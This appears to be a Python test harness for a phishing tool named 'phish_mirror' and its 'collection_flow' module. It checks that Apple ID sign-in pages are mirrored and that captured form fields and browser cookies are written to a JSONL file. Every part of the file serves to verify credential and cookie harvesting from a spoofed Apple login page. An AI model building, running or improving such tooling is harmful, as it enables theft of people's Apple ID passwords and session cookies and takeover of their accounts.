#!/usr/bin/env python3
"""Unit checks + short headless integration run for collection_flow."""

from __future__ import annotations

import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent

from collection_flow import (  # noqa: E402
    page_content_fingerprint,
    text_ready_for_save,
)


def test_text_ready() -> None:
    assert not text_ready_for_save('.', loading=False)
    assert not text_ready_for_save('Loading...', loading=False)
    assert not text_ready_for_save('Sign In with Apple ID', loading=True)
    assert text_ready_for_save(
        'Sign In with Apple ID\n\nEmail or Phone Number\nPassword\nContinue',
        loading=False,
    )


def test_fingerprint_stable() -> None:
    key = 'frame|/appleauth/auth/authorize/signin|email|noerr'
    text = 'Sign In\\nEmail or Phone Number'
    a = page_content_fingerprint(key, text)
    b = page_content_fingerprint(key, text + '  ')
    assert a == b


def run_integration(seconds: int = 75) -> None:
    with tempfile.TemporaryDirectory(prefix='coll_flow_') as tmp:
        out = Path(tmp)
        cmd = [
            sys.executable,
            str(ROOT / 'phish_mirror.py'),
            '--headless',
            '--selftest',
            '--run-seconds',
            str(seconds),
            '--out',
            str(out),
            '--poll-ms',
            '80',
        ]
        for channel in ('chrome', 'msedge', 'chromium'):
            attempt = cmd + ['--channel', channel]
            print(f'integration: {" ".join(attempt)}', flush=True)
            try:
                proc = subprocess.run(
                    attempt,
                    cwd=str(ROOT),
                    timeout=seconds + 120,
                    capture_output=True,
                    text=True,
                )
            except subprocess.TimeoutExpired as e:
                raise AssertionError(f'phish_mirror hung: {e}') from e
            if proc.returncode == 0:
                break
            if 'Executable doesn' in (proc.stderr or '') or 'Failed to launch' in (proc.stderr or ''):
                continue
            print(proc.stdout, flush=True)
            print(proc.stderr, file=sys.stderr, flush=True)
            raise AssertionError(f'phish_mirror exit {proc.returncode}')
        else:
            raise AssertionError('no Playwright browser channel available')

        pages = list(out.glob('apple_page_*.txt'))
        assert pages, 'expected at least one apple_page_*.txt'
        bodies = [p.read_text(encoding='utf-8') for p in pages]
        assert any(
            len(b) > 120
            and any(
                kw in b.lower()
                for kw in ('email', 'password', 'verification', 'apple id', 'sign in')
            )
            for b in bodies
        ), f'page snapshots look empty/loading-only: {[b[:120] for b in bodies]}'

        jsonl = out / 'apple_capture.jsonl'
        assert jsonl.is_file(), 'expected apple_capture.jsonl'
        lines = jsonl.read_text(encoding='utf-8').strip().splitlines()
        assert len(lines) >= 3, 'expected listener events in jsonl'
        import json

        sample = json.loads(lines[-1])
        assert 'fields' in sample and 'contextCookies' in sample
        print(f'integration OK: {len(pages)} page file(s), {len(lines)} jsonl events', flush=True)


def main() -> int:
    test_text_ready()
    test_fingerprint_stable()
    run_integration()
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
